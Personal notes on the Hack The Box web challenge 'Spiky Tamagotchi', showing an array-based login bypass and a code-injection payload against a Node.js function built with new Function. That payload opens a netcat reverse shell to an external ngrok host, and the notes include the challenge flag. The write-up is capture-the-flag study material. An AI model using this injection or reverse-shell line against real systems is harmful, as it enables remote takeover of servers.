---
title: "Spiky Tamagotchi (Web)"
category: "web"
subcategory: "htb-challenges"
type: "writeup"
tags: ["my-notes", "personal", "eval", "exec", "spiky", "tamagotchi", "web", "htb-challenges"]
summary: "Personal note: Spiky Tamagotchi (Web)."
source:
  name: "Personal notes"
origin_path: "HTB Challenges/Web/Spiky Tamagotchi.md"
---

## In the login page

### database.js

preparedStatement

```
SELECT username FROM users WHERE username = ? AND password = ?
```

```
{"username":"admin","password":"admin"}
```

If we pass

```
{"username":[0],"password":[0]}
```

it will work

---

## Exploit

```
const calculate = (activity, health, weight, happiness) => {
    return new Promise(async (resolve, reject) => {
        try {
            // devine formula :100:
            let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
                if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
                }`;
            quickMaths = new Function(res);
            const {m, hp, w, hs} = quickMaths();
            resolve({mood: m, health: hp, weight: w, happiness: hs})
        }
        catch (e) {
            reject(e);
        }
    });
}
```

### injection point

```
{"activity":"feed","health":"60","weight":"42","happiness":"50"}
```

### preparation

```
feed' == 'feed' && 1==1 && 'feed
```

```
{
"activity":"feed' == 'feed' && eval(1==1) && 'feed",
"health":"60",
"weight":"42",
"happiness":"50"
}
```

### payload

```
'+(global.process.mainModule.require('child_process').exec('nc 7.tcp.eu.ngrok.io:19648 -e /bin/sh'))+'
```

```
{
"activity":"'+(global.process.mainModule.require('child_process').exec('nc 7.tcp.eu.ngrok.io:19648 -e /bin/sh'))+'",
"health":"60",
"weight":"42",
"happiness":"50"
}
```

### rev shell

```
7.tcp.eu.ngrok.io:19648
```

### loot

```
HTB{s0rry_1m_n07_1nt0_typ3_ch3ck5}
```

---

*From your own notes: `HTB Challenges/Web/Spiky Tamagotchi.md`*
